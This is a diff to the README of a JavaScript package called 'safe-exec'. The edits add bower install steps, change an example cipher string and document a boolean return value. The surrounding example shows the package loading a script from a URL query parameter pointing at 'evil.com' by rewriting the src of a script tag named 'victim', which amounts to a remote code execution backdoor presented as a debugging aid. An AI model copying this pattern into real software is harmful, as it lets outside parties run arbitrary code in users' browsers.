@@ -8,8 +8,16 @@ Uses RSA key pairs.
 
 # Installation
 
+Via [npm](https://www.npmjs.com/package/safe-exec):
+
 ```sh
 npm install safe-exec
+```
+
+Via bower:
+
+```sh
+bower install safe-exec
 ```
 
 # Test
@@ -32,7 +40,7 @@ http://example.com?privateKey=foobar&message=http://evil.com/intent.js
 Then somewhere in your code:
 
 ```js
-exec(location.search, 'reallylongcipher', sessionStorage, (message) => {
+exec(location.search, 'somereallylongcipher', sessionStorage, (message) => {
   let victim = document.querySelector('script[src="foobar.js"]');
 
   victim.setAttribute('src', message);
@@ -51,7 +59,7 @@ This is useful for environments that are difficult replicate on your local machi
 
 # API
 
-## exec(search, publicKey, sessionStorage, cb)
+## exec(search, publicKey, sessionStorage, cb) 	&rarr; boolean
 
 Executes code if a valid public/private key pair is present.
 
@@ -59,6 +67,8 @@ Executes code if a valid public/private key pair is present.
 * `publicKey` - any valid RSA public key.
 * `sessionStorage` - pass a reference to DOM `sessionStorage` to persist execution across session.
 * `cb` - callback `message => ` where code execution is defined.
+
+Returns `true` on success and `false` on failure.
 
 # License
 
